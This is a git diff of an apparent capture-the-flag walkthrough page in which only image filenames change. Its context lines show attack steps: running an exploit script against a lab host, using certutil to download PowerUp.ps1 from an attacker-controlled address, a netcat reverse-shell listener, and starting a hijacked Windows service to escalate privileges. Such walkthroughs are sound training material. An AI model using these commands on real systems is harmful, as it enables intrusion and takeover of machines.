@@ -8,7 +8,7 @@
 
 **Who is the employee of the month?**
 
-<figure><img src="../../.gitbook/assets/image (9) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **Initial Access**
 
@@ -64,7 +64,7 @@ python2 exploit.py 10.10.181.159 8080
 
 **Use Metasploit to get an initial shell. What is the user flag?**
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Privilege Escalation
 
@@ -83,7 +83,7 @@ certutil -urlcache -f http://10.10.228.214:81/PowerUp.ps1 PowerUp.ps1
 Invoke-AllChecks
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -113,7 +113,7 @@ nc -lvnp 4443
 sc start AdvancedSystemCareService9
 ```
 
-![](<../../.gitbook/assets/image (3) (1) (2).png>)
+![](<../../.gitbook/assets/image (3) (1) (2) (1).png>)
 
 ``
 
